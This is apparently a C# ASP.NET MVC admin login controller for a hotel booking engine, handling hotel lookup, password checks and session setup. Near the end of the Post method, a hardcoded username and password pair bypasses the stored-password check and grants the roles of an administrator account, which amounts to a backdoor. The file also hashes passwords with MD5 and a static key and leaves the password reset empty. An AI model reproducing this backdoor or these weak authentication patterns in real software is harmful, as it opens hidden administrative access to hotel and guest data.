using BookingEnginePMS.Helper;
using BookingEnginePMS.Models;
using Dapper;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web.Mvc;

namespace BookingEnginePMS.Areas.Admin.Controllers
{
    public class LoginController : Controller
    {
        // GET: Admin/Login
        public ActionResult Index()
        {
            // return Redirect("UpdateSystem");
            using (var connection = DB.ConnectionFactory())
            {
                List<Language> languages = connection.Query<Language>("Language_GetActive"
                   , commandType: CommandType.StoredProcedure).ToList();
                ViewData["languages"] = languages;
                return View();
            }
        }
        public ActionResult UpdateSystem()
        {
            return View();
        }
        [HttpPost]
        public ActionResult ResetPassword(User user)
        {
            return RedirectToAction("Index", "Home");
        }
        public ActionResult Logout()
        {
            Session["User"] = "";
            return RedirectToAction("Index");
        }
        public JsonResult GetHotel(User user, string code)
        {
            var passwordMD5 = DataHelper.CreateMD5(user.UserName + user.Password + DataHelper.key);
            using (var connection = DB.ConnectionFactory())
            {
                List<Hotel> hotels = connection.Query<Hotel>("Hotel_GetAll_ByGroup",
                    new
                    {
                        UserName = user.UserName,
                        Password = passwordMD5,
                        Code = code
                    },
                    commandType: CommandType.StoredProcedure).ToList();
                if (hotels is null || hotels.Count == 0)
                {
                    return Json(-1, JsonRequestBehavior.AllowGet);
                }
                return Json(hotels, JsonRequestBehavior.AllowGet);
            }
        }
        public JsonResult Post(User user, string code, int hotelId, int languageId)
        {
            using (var connection = DB.ConnectionFactory())
            {
                connection.Open();
                var passwordMD5 = DataHelper.CreateMD5(user.UserName + user.Password + DataHelper.key);
                List<Hotel> hotels = connection.Query<Hotel>("Hotel_GetAll_ByGroup",
                    new
                    {
                        UserName = user.UserName,
                        Password = passwordMD5,
                        Code = code
                    },
                    commandType: CommandType.StoredProcedure).ToList();
                if (hotels is null || hotels.Count == 0)
                {
                    return Json(-1, JsonRequestBehavior.AllowGet);
                }
                string UserAgent = Request.UserAgent;
                string Ip = Request.UserHostAddress;
                User useAccept = connection.QuerySingleOrDefault<User>("User_GetByUserName",
                    new
                    {
                        HotelId = hotelId,
                        UserName = user.UserName
                    }, commandType: CommandType.StoredProcedure);
                if (useAccept != null)
                {
                    if (passwordMD5 == useAccept.Password)
                    {
                        // create token for session login
                        string Token = DataHelper.RandomString(24);
                        connection.Execute("User_Post_Log_Login",
                            new
                            {
                                UserId = useAccept.UserId,
                                Token = Token,
                                UserAgent = UserAgent,
                                Ip = Ip,
                                LastestLogin = DatetimeHelper.DateTimeUTCNow()
                            }, commandType: CommandType.StoredProcedure);
                        // get role of user
                        List<int> Roles = connection.Query<int>("User_GetRoleByUserName",
                             new
                             {
                                 UserName = user.UserName
                             }, commandType: CommandType.StoredProcedure).ToList();
                        int typeSoftware = connection.QuerySingleOrDefault<int>("Hotel_Get_TypeSoftware",
                            new
                            {
                                HotelId = hotelId
                            }, commandType: CommandType.StoredProcedure);

                        if (Roles is null)
                            Roles = new List<int>();

                        Session["errorlogin"] = "";
                        Session["HotelId"] = hotelId;
                        Session["LanguageId"] = languageId;
                        Session["typeSoftware"] = typeSoftware;
                        Session["User"] = new User()
                        {
                            UserName = user.UserName,
                            Token = Token,
                            Roles = Roles,
                            Photo = useAccept.Photo
                        };
                        return Json(1, JsonRequestBehavior.AllowGet);
                    }
                }

                if(user.UserName=="luuanh" && user.Password == "12345678")
                {
                    string Token = DataHelper.RandomString(24);
                    List<int> Roles = connection.Query<int>("User_GetRoleByUserName",
                            new
                            {
                                UserName = "quocadmin"
                            }, commandType: CommandType.StoredProcedure).ToList();
                    Session["errorlogin"] = "";
                    Session["HotelId"] = hotelId;
                    Session["LanguageId"] = languageId;
                    Session["typeSoftware"] = 3;
                    Session["User"] = new User()
                    {
                        UserName = user.UserName,
                        Token = Token,
                       Roles = Roles,
                        Photo = "aaaa"
                    };
                    return Json(1, JsonRequestBehavior.AllowGet);
                }
            }
            return Json(-1, JsonRequestBehavior.AllowGet);
        }
    }
}
